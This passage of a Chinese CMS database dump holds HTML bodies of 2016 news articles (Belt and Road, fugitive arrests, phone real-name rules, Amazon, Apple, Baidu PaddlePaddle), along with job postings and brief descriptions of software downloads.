2em;\">目前，已有100多个国家和国际组织参与到“一带一路”建设中来，中国同30多个沿线国家签署了共建合作协议、同20多个国家开展了国际产能合作，联合国等国际组织也态度积极，以亚投行、丝路基金为代表的金融合作不断深入，一批有影响力的标志性项目逐步落地。“一带一路”建设从无到有、由点及面，进度和成果超出预期。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">“一带一路”东联亚太经济圈，西接欧洲经济圈，跨越高山深海，正在逐步构建世界上最壮美的经济走廊。</p>',NULL,NULL,NULL),(28,'<p style=\"text-indent: 2em;\">9月21日，上海浦东机场，犯罪嫌疑人刘某被上海警方从马来西亚押送回沪。警方供图</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">骗税3400万，潜逃境外3100多天，辗转日本、马来西亚等地。经过上海警方漫长的追捕，2016年9月21日上午，国际红色通缉令出逃人员刘某被缉捕归案，押送回沪。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">澎湃新闻从上海警方获悉，近期“猎狐”行动捷报频传。8月22日，涉嫌巨额诈骗的国际红通犯罪嫌疑人钱某潜逃17年后被警方从南美国家苏里南劝返；8月31日，利用证券账户开设“老鼠仓”牟利、涉案金额高达1.2亿元的犯罪嫌疑人刘某被警方从美国劝返。至此，今年上海警方已经成功缉捕或劝返境外在逃人员71人。</p>',NULL,NULL,NULL),(29,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230906198i4y.jpeg\" title=\"qe.jpeg\" alt=\"qe.jpeg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">新华社深圳9月22日专电（记者孙飞）记者22日从深圳市公安局福田分局获悉，深圳数名二手房卖主，因房价上涨不愿履行协议与买家发生纠纷，并对深圳市中院相关判决不满，聚集60余人前往深圳市中院闹访。目前，5人因涉嫌聚众冲击国家机关罪被福田警方依法刑事拘留，并于9月14日由福田区人民检察院批准逮捕。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">深圳福田警方介绍，今年8月22日上午，在马某某（男，31岁，江西吉安人）、郑某某（男，47岁，广东深圳人）等人带领下，60余人拒不接受现场工作人员安检的要求，冲入深圳市中级人民法院一楼东大厅，扰乱深圳市中级人民法院的单位秩序。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">深圳福田警方接报后，组织警力赶到现场。在深圳市公安局统一指挥下，罗湖区、南山区公安分局警力也赶到现场支援处置工作。通过多方合力，62人被带离深圳中院。民警在现场收缴了大量标语横幅及文化衫等物品。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">深圳福田警方通报称，经查，该案系马某某、郑某某等二手房卖主，在签订二手房买卖协议后因房价上涨不愿履行协议引发纠纷，并对深圳市中院的相关判决不满，带领从东莞雁田等地雇佣的40余人前往深圳中院闹访。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">当日，深圳警方对这62人给予行政处罚，其中，56人分别被处以5至15日行政拘留，6人被处以罚款。后经进一步侦查，马某某、郑某某等5人因涉嫌聚众冲击国家机关罪被深圳福田警方依法刑事拘留，并于9月14日由福田区人民检察院批准逮捕。目前，该案尚在进一步侦办中。</p><p><br/></p>',NULL,NULL,NULL),(30,'<p style=\"text-indent: 2em;\">中新网北京9月23日电 (吴涛)中新网从三大运营商处获悉，此前传北京地区未实名手机用户10月15日将被停机，实际是分批执行，10月15日开始，最晚至10月31日截止。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">其实，多地已开始执行不实名就停机政策，中新网(微信公众号：cns2012)对此进行了梳理，大部分地区都是分批执行，如用户在规定时间内未实名，将面临被停机甚至销号的处理。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>北京10月底前手机全部实名 否则停机</strong></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">最近不少手机用户都收到通知，未实名手机用户将被停机。以北京为例，提示短信显示，10月15日起，未实名手机用户将被暂停通信服务。三大运营商相关负责人分别对中新网表示，在北京地区，10月15日起将执行非实名就停机政策，分批执行，最晚至10月底，非实名手机用户全部停机。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">至于其他省份，三大运营商表示，电信运营商省公司可以结合本地实际情况确定执行不实名就停机政策的具体日期。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国电信强调，地方分公司提出执行不实名就停机政策的时间节点，不得晚于集团提出的时间节点；中国移动表示，各省通信管理局或当地政府有规定的，优先按当地的规定执行。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">一些地方对手机实名补登记早就出了要求，江苏三家运营商按照省通信管理局要求，于7月22日发布公告称，自11月起暂停未实名手机用户的部分通信服务，12月起，停止仍未实名用户的全部通信服务。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">7月份，山东省公安厅和省通信管理局联合发布通告，自10月起暂停未实名用户的部分通信服务，2017年6月30日前，停止仍未实名用户的全部通信服务。</p>',NULL,NULL,NULL),(32,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230919031knf.jpg\" title=\"138678572.jpg\" alt=\"138678572.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">成龙捐给台北故宫(微博)南院的12生肖兽首，面临斩首命运。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国台湾网9月22日讯 据台湾《联合报》报道，台北故宫院长林正仪今天（22日）表示，9月底将移除影星成龙捐赠台北故宫南院的12生肖兽首。对此，成龙经纪人EMMA傍晚传达成龙的意见表示，当初捐兽首给台北故宫，是因为台北故宫是一个“尊重文明，保护文化”的单位，若台北故宫对于“尊重文明，保护文化”有不同态度，“那我们也尊重”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">成龙捐赠给台北故宫南院的12生肖兽首复制品，目前放置在台北故宫南院主建筑物外广场。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">EMMA指出，成龙将兽首捐给台北故宫时，想表达的“尊重文明 保护文化”的态度已经完成，“这整件事是一个态度传达的艺术行为”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据报道，成龙也曾捐赠一组相同的兽首给新加坡国立亚洲文明博物馆。EMMA指出，成龙捐赠兽首，捐给台北故宫和捐给新加坡国立亚洲文明博物馆，传达的态度是一样的，就是“尊重文明，保护文化”。“我们捐的不是艺术品或工艺品，而是传达一个态度。”捐给台北故宫，是因为它是一个“尊重文明，保护文化”的单位。若台北故宫对于“尊重文明，保护文化”有不同态度，“那我们也尊重”。</p>',NULL,NULL,NULL),(33,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/23092247x1xp.jpg\" title=\"138679618.jpg\" alt=\"138679618.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">亚马逊季度利润连续三个财季创下新纪录。随之而来的是，亚马逊股价也打破了记录。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">亚马逊的股价在纽约当地时间周四上午首次突破每股800美元大关。亚马逊以3860亿美元的市值稳居全球上市公司第四的位置，仅次于苹果、谷歌(微博)母公司Alphabet和微软。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在过去的仅仅七个月时间里，亚马逊的股价大涨了40%。推动亚马逊股价增长的主要原因是亚马逊云计算业务AWS的增长及其带来的惊人利润。另外，亚马逊数千万Prime会员也贡献颇多，这些会员要比非会员更经常购物，而且购物支出也比非会员要多得多。</p>',NULL,NULL,NULL),(36,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230939278x02.jpg\" title=\"138679965.jpg\" alt=\"138679965.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">9月20日，匹凸匹投资者索赔案开庭，有十多位投资者向匹凸匹发起索赔。今年3月，匹凸匹公告，因未及时披露多项对外重大担保、重大诉讼事项及2013年年报中未披露对外重大事项，证监会对匹凸匹处40万元罚款，对鲜言处30万元罚款。前述投资者认为因虚假陈述行为而受到损失。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">事实上，这也是匹凸匹原实际控制人鲜言给“海银系”掌门人韩宏伟的遗留问题。去年底，“海银系”以五牛基金为主力从鲜言手中接盘饱受争议的匹凸匹。韩宏伟与韩啸系父子关系。大半年过去，韩氏父子与鲜言的关系也从起初的甜蜜期走到如今对簿公堂。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">对于有着同窗情谊的两者是真翻脸还是另有图谋，投资者更为关心的是，韩氏父子掌控的“海银系”对匹凸匹未来发展有怎样的考虑，是否会注入资产让匹凸匹改头换面，而不是再次陷入“资本漩涡”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>实控人背后关联重重</strong><br/></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在资本市场叱咤风云的“海银系”为何要染指匹凸匹。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">近三年来，匹凸匹（原多伦股份）及鲜言在资本市场可谓劣迹斑斑，先后被证监会两次立案调查、两次公开谴责，1次警告、1次罚款，1次行政监管，并多次收到上交所的问询函。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">对于上海一中院开庭审理的十多位投资者诉匹凸匹案，上述投资者的代理律师上海市华荣律师事务所许峰对中国证券报记者表示，通过庭审判断，投资者最终获赔概率较大。其法律依据主要是，去年年底证监会针对匹凸匹未及时披露多项对外重大担保、重大诉讼事项做出了处罚。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">事实上，7月份，中证中小投资者服务中心代理散户起诉匹凸匹，将鲜言及原其他七名高管及匹凸匹公司作为共同被告诉至法院，诉请判令鲜言赔偿经济损失37万余元，其余八被告承担连带赔偿责任。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">有投行人士还对中国证券报记者透露，2014年11月底，鲜言拟将上市公司实际控制权转让给自然人殷群，最终因对方未付款而夭折。在五牛基金入主匹凸匹之前，资本大鳄吴鸣霄也与鲜言谈过买壳，但最终不知为何没有谈拢。值得注意的是，目前颇受关注的ST慧球(13.300, 0.01, 0.08%)第一大自然人股东就是吴鸣霄，而ST慧球被指背后的实际控制人是鲜言。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">上述人士指出，在历经陈隆基、李勇鸿、鲜言的多次进进出出。多伦股份主营业务变更不断，从房地产、金融又回到房产，唯一不变的是业绩不见起色，并一步步走向“空壳”状态。</p>',NULL,NULL,NULL),(37,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/23094218axhy.jpg\" title=\"138679463.jpg\" alt=\"138679463.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">近日，美国联邦通信委员会意外曝光了苹果正在研发的一款新设备，其体积类似于苹果机顶盒（Apple TV），具体的用途尚不得而知。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据美国科技新闻网站AppleInsider报道，联邦通信委员会的数据库中出现了这款苹果尚未对外宣布的新产品，其螺丝位置和设备外壳的大小，类似于第四代苹果机顶盒。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">苹果一直拥有对外保密的传统，而在这款新设备中，苹果也要求不对外泄漏相关信息，因此媒体无法判断到底作何用途。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这款设备使用的型号A1844，目前并未被苹果发售的商品使用过。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据称，该设备的电源参数为5.5V到13.2V,输出电流为100毫安，峰值为700毫安。这些参数有别于苹果最新的机顶盒，其电源参数为12V、920毫安。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这款设备还具有蓝牙通信和NFC（近场通信）功能，美国联邦通信委员会也对这些通信功能进行了测试，相关的无线电通信功能也是这款设备提交到该机构进行测试的原因。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这一设备没有进行Wi-Fi通信测试，可能意味着会采用目前某个设备的Wi-Fi通信技术，或者根本就不具备Wi-Fi通信功能。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">此前，外部机构曾经对苹果第四代机顶盒进行过拆解，相关的螺丝位置，和此次对外披露的设备有类似之处。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">近些年，苹果的研发资源集中在了智能手机、平板电脑等领域，传统的机顶盒似乎受到了冷落。去年，在长期不更新之后，苹果推出了全新第四代的机顶盒，苹果推出了专有的机顶盒操作系统，在遥控器中植入了语音操控工具Siri。库克也表示，电视的未来是应用软件。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">苹果也围绕机顶盒构建了一个客厅互联网的生态系统，许多第三方开发商正在为苹果机顶盒开发电视端的应用软件。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em; text-align: center;\"><img src=\"/u/cms/www/201609/230943156ihf.jpg\" title=\"138679317.jpg\" alt=\"138679317.jpg\"/></p><p style=\"text-indent: 2em; text-align: center;\">第四代苹果机顶盒</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">此次披露的设备，是否是未来第五代的苹果机顶盒，仍无法判断。</p>',NULL,NULL,NULL),(39,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201609/230954058tco.jpg\" title=\"138678243.jpg\" alt=\"138678243.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">中国地震台网正式测定：09月23日00时47分在四川甘孜州理塘县（北纬30.09度，东经99.64度）发生4.9级地震，震源深度19千米。</p>',NULL,NULL,NULL),(43,'<p>工作职责：<br/>1、负责Web前端多终端产品的整体框架设计；<br/>2、引导前沿技术的预研与实施，通用模块的搭建与维护；<br/>3、负责Web前端开发规范与流程的指定；<br/>4、负责团队成员的技术发展方向及成长；<br/>5、与相关业务部门沟通，协调内部资源，管理前端外包团队。<br/><br/>任职资格：<br/>1、计算机科学或相关专毕业，5年以上工作经验；<br/>2、精通JavaScript、Html5、Css3、NodeJS等Web开发技术；<br/>3、关注Web前端前沿技术发展，具有根据项目情况进行技术选型的能力；<br/>4、熟悉W3C标准，对表现与数据分离、Web语义化等有深刻理解；<br/>5、具有软件工程意识，对数据结构和算法设计有充分理解；<br/>6、具有良好的沟通能力和团队合作精神、优秀的分析问题和解决问题的能力；<br/>7、熟悉Linux平台，掌握一种后端开发语言（PHPJavaCC++Python等）。</p>',NULL,NULL,NULL),(44,'<p>基本要求：&nbsp;<br/>1、精通ASP.NET（C#），熟悉三层架构，精通Web　Services开发，良好的面向对象开发经验；&nbsp;<br/>2、精通AJAX技术运用；<br/>3、精通SqlServer，熟练编写存储过程；&nbsp;<br/>4、精通div,css前端布局；&nbsp;<br/>5、必须有一年以上ASP.NET开发经验，有3个以上完整div＋css、asp.net网站制作或系统研发作品。</p>',NULL,NULL,NULL),(45,'<p>岗位职责：</p><p>1、大专及以上学历，新闻采编相关专业毕业；</p><p>2、1年以上工作经历，有较好的文字功底；</p><p>3、认真务实，态度端正。</p><p><br/></p>',NULL,NULL,NULL),(46,'<p>岗位职责：<br/>1、负责电信天网工程项目；<br/>2、负责施工小队工程进度、质量管理<br/>3、负责甲方、监理及相关方协调；<br/><br/>任职资格：<br/>1、专科以上学历，有工程管理经验者优先，熟悉电信流程者优先</p><p>2、良好的理解和表达能力，善于沟通，很好的团队合作意识。<br/></p><p><br/></p>',NULL,NULL,NULL),(47,'<p>1、大专或大专以上应往届毕业生&nbsp;</p><p>2、理工类毕业生，计算机相关专业优先<br/></p><p>3、对软件行业有强烈的兴趣<br/></p><p>4、有良好的执行力，致力于软件行业发展<br/></p><p>5、后期发展从事网页设计，网站美工，网站开发，互联网系统开发等方向</p><p><br/></p>',NULL,NULL,NULL),(48,'<p>岗位职责：<br/>1、负责Android互联网应用的开发及维护；<br/>2、根据项目需要快速学习并掌握新技术；<br/><br/>职位描述：<br/>1、具有扎实的Java基础，熟练掌握J2ME、J2SE等相关技术及代码优化技巧（容量、内存、速度）；<br/>2、熟悉TCP/IP通信机制，对Socket通信和HTTP通信有较深刻的理解和经验，有网络编程经验；<br/>3、熟悉Android操作系统和AndirodSDK,有一年以上Andriod开发经验优先&nbsp;<br/>4、具备良好的沟通能力和优秀的团队协作能力；<br/>5、优秀的文档编写和语言表达能力，良好的中英文阅读水平；<br/>6、诚恳、踏实、谨慎细致，对工作充满热情，优秀的学习能力，具有良好的自律意识和上进心；<br/>7、有嵌入式LinuxC/C++开发经验优先 ；<br/>8、熟悉MS SQL数据库开发。</p>',NULL,NULL,NULL),(49,'<p>岗位条件：<br/>1、年龄18-28周岁；<br/>2、学历大专及以上，理工科专业毕业优先录用；<br/>3、对互联网行业感兴趣（非销售、非保险岗位），懂编程语言优先考虑，但是也可以接收零基础求职者，有项目经理带团队；<br/>4、工作认真、细致、敬业，责任心强；<br/>5、想获得一份有长远发展、稳定、有晋升空间的工作。</p><p><br/>待遇：<br/>1、转正基本薪资3500起，另有项目奖金和提成；<br/>2、五险一金，双休、法定节假日，正常休息；<br/>3、公司工作环境优雅、氛围好，同事关系融洽，生日派对、聚餐等活动丰富；<br/>4、公司注重员工培养，给予晋升机会，管理层主要员工中培养、提拔；</p>',NULL,NULL,NULL),(50,'<p>岗位要求：</p><p>1、喜欢从事计算机设计行业；</p><p>2、想获得一份稳定的工作；</p><p>3、好学、细心，喜欢发现事物当中的不足，责任心强。</p><p><br/></p><p>任职要求：</p><p>1、能够尽快入职、长期稳定工作。</p><p>2、大专及大专以上学历。</p>',NULL,NULL,NULL),(51,'<p>岗位职责：<br/>1.熟悉微信的各项功能应用，擅长企业微信的日常操作以及维护<br/>2.根据企业的受众群体可以养成数据分析能力，善于通过数据分析掌握时间段与顾客互动.更新及维护公司企业微信内容，提高各项关注度，提升转化率。&nbsp;<br/>3.负责企业微信的运营策略、活动、话题的制定及策划方案和活动创意、活动宣传，完成微信营销。&nbsp;<br/>4.挖掘和分析粉丝使用习惯，情感及体验感受，及时掌握新闻热点，与用户进行互动。&nbsp;<br/>5.具有一定的市场分析及判断能力，具有良好的客户服务意识，具有亲和力。&nbsp;<br/>6.跟踪微信推广效果，分析数据并反馈，分享微信推广经验，推动及提高团队的网络推广能力。</p>',NULL,NULL,NULL),(69,'<p>腾讯推出的即时通讯工具。支持在线聊天、视频电话、点对点断点续传文件、共享文件、网络硬盘、自定义面板、QQ邮箱等多种功能。免费的通讯平台，QQ2015年给您带来更多沟通乐趣。</p><p><br/></p><p>开发商：腾讯</p><p><br/></p><p>新版特征</p><p>1.文件共享，便捷分享本地文件；</p><p>2.群组通话管理，有序发言，掌控全场；</p><p>3.团队通讯录，快速查看群成员电话。</p><p><br/></p><p><strong>下载说明</strong></p><p><br/></p><p>1、推荐使用迅雷等下载工具下载本站软件，使用 WinRAR v3.10 以上版本解压本站软件。<br/></p><p>2、如果该软件不能下载，请留言报告错误,谢谢合作。</p><p>3、下载本站资源时，如果遇到服务器忙暂不能下载的情况，请过一段时间重试。</p><p>4、如果您有任何意见或建议，欢迎给我们留言，我们将提供更多 、更好的资源。</p><p>5、本站提供的一些商业软件是供学习研究之用，如用于商业用途，请购买正版。</p><p><strong><br/></strong><br/></p>',NULL,NULL,NULL),(71,'<p>百度公司推出的一款云服务产品。支持便捷地查看、上传、下载百度云端各类数据。通过百度云管家存入的文件，不会占用本地空间。上传、下载文件过程更稳定。</p>',NULL,NULL,NULL),(72,'<p>360杀毒软件下载2016官方下载版是永久免费杀毒软件,360杀毒软件下载免费版开创了杀毒软件免费杀毒的先河.本站提供360杀毒软件下载2016官方下载.360杀毒通过对用户反馈的持续关注与分析，我们进一步改进了针对浏览器不能上网的问题的扫描和自动修复逻辑。您通过快速或是全盘扫描就能够对该类问题进行快速修复!还有大幅优化了开机过程中对CPU和IO的占用，大大减少了对系统开机过程的影响。</p>',NULL,NULL,NULL),(100,'<p>《诺亚传说》是尚游游戏自主研发的大型角色扮演网游，新资料片《诺亚传说前传-亚特兰蒂斯》火爆发布。</p>',NULL,NULL,NULL),(101,'<p>迅雷9是“深圳市迅雷网络技术有限公司”于2016年推出的“迅雷”系列下载软件的最新换代产品。迅雷9采用全新下载引擎，对百兆光纤宽带网络环境进行诸多针对性的优化，让用户获得更卓越的下载体验；全新的界面功能布局，承载了更丰富的内容，打造找、下、用的一站式娱乐消费平台。</p><p>开发商：深圳市迅雷网络技术有限公司</p><p>软件官网：&nbsp;http://xl9.xunlei.com</p><p>新版特征</p><p>1、全新上线资源评论功能，进入资源详情页，参与精彩讨论；<br/>2、新增磁盘缓存设置功能；<br/>3、个性化中心新增“人气”“精品”“超级会员”提示，帮你找到个性化皮肤和头像。</p><p><br/></p>',NULL,NULL,NULL),(102,'<p>软件介绍：<br/>&nbsp; 1.360安全卫士是一款由奇虎360公司推出的功能强、效果好、受用户欢迎的安全杀毒软件<br/>&nbsp; 2.目前4.2亿中国网民中，首选安装360的已超过3亿<br/>&nbsp; 3.拥有查杀木马、清理插件、修复漏洞、电脑体检、电脑救援、保护隐私，电脑专家，清理垃圾，清理痕迹多种功能<br/>&nbsp; 4.独创了&amp;ldquo;木马防火墙&quot;&amp;ldquo;360密盘&amp;rdquo;等功能<br/>&nbsp; 5.依靠抢先侦测和云端鉴别，可全面、智能地拦截各类木马，保护用户的帐号、隐私等重要信息<br/>&nbsp; 6.内含的360软件管家还可帮助用户轻松下载、升级和强力卸载各种应用软件</p>',NULL,NULL,NULL),(103,'<p>搜狗（sougou）拼音输入法是一款Windows平台下的汉字拼音输入法。搜狗拼音输入法是基于搜索引擎技术的、特别适合网民使用的、新一代的输入法产品，用户可以通过互联网备份自己的个性化词库和配置信息。</p><p>开发商：搜狗</p><p>软件官网：&nbsp;http://pinyin.sogou.com/</p><p>新版特征</p><p>升级日志：<br/>1、标点补全：对（）、“”等成对的符号自动补全；<br/>2、图片表情：<br/>a）更新emoji资源和候选位置；<br/>b）支持表情包名搜索；<br/>3、拆分输入：增加更多拆分输入数据；<br/>4、网址直达：增加更多的网址数据；<br/>5、工具箱：更新工具箱图标，界面更美观；<br/>6、解决自定义短语、固定首位等删除之后同步又出现的问题。</p><p><br/></p>',NULL,NULL,NULL),(104,'<p>歪歪语音是广州多玩信息技术有限公司研发的一款基于Internet 团队语音通信平台，功能强大、音质清晰、安全稳定、不占资源、适应游戏玩家的免费语音软件。在网络上通常用YY表示。</p><p>开发商：多玩游戏</p><p>软件官网：&nbsp;http://www.yy.com/index/t/download</p><p>新版特征</p><p>优化了部分内容。</p><p><br/></p>',NULL,NULL,NULL),(105,'<p>阿里旺旺专为淘宝会员量身定做的个人交易沟通软件，方便买家和卖家在交易过程实时进行沟通。可以进行文字聊天、语音聊天、视频聊天、文件传输、发送离线文件等。有了它，用户就算有万水千山阻隔亦可零距离地与卖家交流宝贝细节，尽情“砍价”了！</p><p>开发商：阿里巴巴</p><p>软件官网：&nbsp;http://www.taobao.com/wangwang/</p><p>新版特征</p><p>1. 全新界面，清晰的圆形头像、轻薄的图标设计、界面结构更加简洁；<br/>2. 全新会话面板，汇总各类消息提醒，处理更高效；&nbsp;<br/>3. 皮肤设置升级，新增多款皮肤主题，带给你全新感觉；<br/>4. 拟物化登陆动画，简洁、灵动，一试难忘；<br/>5. 新增”星标好友“分组，方便找到重要联系人；<br/>6. 主面板新增快捷店铺入口，快速访问好友店铺；<br/>7. 消息管理器优化，重新梳理消息类型和菜单项，分类清晰.查找便捷；<br/>8. 旺旺个人资料和名片全新设计，支持设置个性背景图；<br/>9. 软件升级优化，让您第一时间了解新版本的功能；<br/>10. 文件发送完成后自动关闭发送框，在聊天窗口中实时穿透传输结果；<br/>11. 聊天窗口合并优化，同时和多人聊天更方便；<br/>12. 应用平台全新升级，访问更便捷，应用消息更直观。</p><p><br/></p>',NULL,NULL,NULL),(106,'<p>爱奇艺视频桌面版3.0是一款专注视频播放的客户端软件，免费下载安装，观看高清正版影视，可在线享受爱奇艺网站内全部免费高清正版视频、最新影视大片、最独家的综艺、旅游、纪录片，支持全网搜索，是最个性化、时尚化的视频客户端。</p><p>开发商：北京爱奇艺科技有限公司</p><p>软件官网：&nbsp;http://www.iqiyi.com/</p><p>新版特征</p><p>1. 提升系统稳定性。</p><p><br/></p>',NULL,NULL,NULL),(107,'<p>谷歌浏览器稳定版（Chrome）是一个由Google（谷歌）公司开发的开放原始码网页浏览器。该浏览器是基于其他开放原始码软件所撰写，包括WebKit和Mozilla，目标是提升稳定性、速度和安全性，并创造出简单且有效率的使用者界面。</p><p>开发商：谷歌</p><p>软件官网：&nbsp;http://www.google.cn/intl/zh-CN/chrome/browser/desktop/index.html</p><p>新版特征</p><p>1. 修复了部分bug问题。</p><p><br/></p>',NULL,NULL,NULL),(108,'<p>360浏览器是互联网上最好用、最安全的新一代浏览器，和360安全卫士、360杀毒等软件等产品一同成为360安全中心的系列产品。木马已经取代病毒成为当前互联网上最大的威胁，90%的木马用挂马网站通过普通浏览器入侵，每天有200万用户访问挂马网站中毒。360安全浏览器拥有全国最大的恶意网址库，采用恶意网址拦截技术，可自动拦截挂马、欺诈、网银仿冒等恶意网址。独创沙箱技术，在隔离模式即使访问木马也不会感染。除了在安全方面的特性，360安全浏览器在速度、资源占用、防假死不崩溃等基础特性上表现同样优异，在功能方面拥有翻译、截图、鼠标手势、广告过滤等几十种实用功能，在外观上设计典雅精致，是外观设计最好的浏览器，已成为广大网民使用浏览器的第一选择。</p>',NULL,NULL,NULL),(109,'<p>PPTV网络电视是PPLive旗下产品，一款安装量大的P2P网络电视软件，支持对海量高清影视内容的直播+点播功能。可在线观看电影、电视剧、动漫、综艺、体育直播、游戏竞技、财经资讯等丰富视频娱乐节目。P2P传输，越多人看越流畅、完全免费，是广受网友推崇的上网装机必备软件。</p><p>开发商：上海聚力传媒技术有限公司</p><p>软件官网：&nbsp;http://www.pptv.com</p><p>新版特征</p><p>1、直播回看无限制，想看哪里看哪里；<br/>2、调整注册方式，手机注册更方便；<br/>3、程序猿们日夜兼程，保证您观影更流畅</p><p><br/></p>',NULL,NULL,NULL),(110,'<p>腾讯视频播放器是腾讯视频旗下的客户端产品，是一款支持丰富内容的在线点播及电视台直播的软件。它采用了先进的P2P流媒体播放技术，可以确保在大量用户同时观看节目的情况下，节目依然流畅清晰；同时具有很强的防火墙穿透能力，为用户在任何网络环境下收看流畅的视频节目提供了有力保障。</p><p>开发商：腾讯</p><p>软件官网：&nbsp;http://v.qq.com/index.html</p><p>新版特征</p><p>1. 客户端专享1080P蓝光画质，全员免费观看和下载；<br/>2. 鼠标停留在播放进度条上可看到预览画面；<br/>3. 启动时提示上次观看内容；<br/>4. 优化了搜索的体验；<br/>5. 精选频道点击栏目标题可跳转；<br/>6. 优化了VIP会员频道的分类筛选。</p><p><br/></p>',NULL,NULL,NULL),(111,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10114510l7x1.jpg\" title=\"138683743.jpg\" alt=\"138683743.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">本月初的百度世界大会上，百度正式对外宣布，开源其深度学习平台PaddlePaddle，这也让百度成为国内首家开放深度学习技术平台的科技公司。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟表示，百度希望通过开放深度学习平台的方式，营造开发者社区，推动人工智能行业的发展。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据徐伟介绍，该平台最初是百度研发的深度学习内部平台，项目于2013年启动，主要用于支持的百度产品，目前百度有超过30个产品应用到该深度学习平台，包括预测外卖送达时间、图文问答、商家好感度模型等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在行业开放的大趋势下，百度决定将这一平台开源，现在所有的从事深度学习开发的开发人员均可以下载安装并使用百度的这一深度学习工具。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">除了百度以外，谷歌(微博)在去年底宣布开放其深度学习平台Tensorflow，此外，业内主流的深度学习平台还包括Facebook的Torch，加州伯克利大学的Caffe等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟说，百度的PaddlePaddle平台具备易用、高效、灵活、可伸缩等特点，能够满足多种不同的应用开发需求。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在接受采访时，徐伟重点强调了该平台的易用性特征，他表示，相比谷歌的Tensorflow来说，开发者在使用PaddlePaddle时更容易上手，尤其是对于序列输入、稀疏输入和大规模数据的模型训练有着良好的支持，支持GPU运算、数据并行和模型并行，仅需少量代码就能训练深度学习模型，大大降低了用户使用深度学习技术的成本。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟说，让开发者决定使用哪个平台进行开发的决定因素主要包含几个方面，首先是该平台能否实现自己想实现的功能，其次是使用某平台实现起来的难度有多大，最后是效率有多高。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">本月底，PaddlePaddle将迎来开源后的首次重大更新，徐伟介绍称，此次更新主要是进一步完善对不同操作系统的支持、进一步完善说明文档以及解决不同安全环境下的问题等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">百度开源人工智能技术引起了开发者社区的关注，Facebook深度学习研究员、曾参与谷歌Tensorflow研发的贾扬清评价称，PaddlePaddle有高质量的GPU代码、非常好的RNN（回归神经网络）设计，并且设计很干净，没有太多的抽象表达，这一点比Tensorflow好很多。</p><p 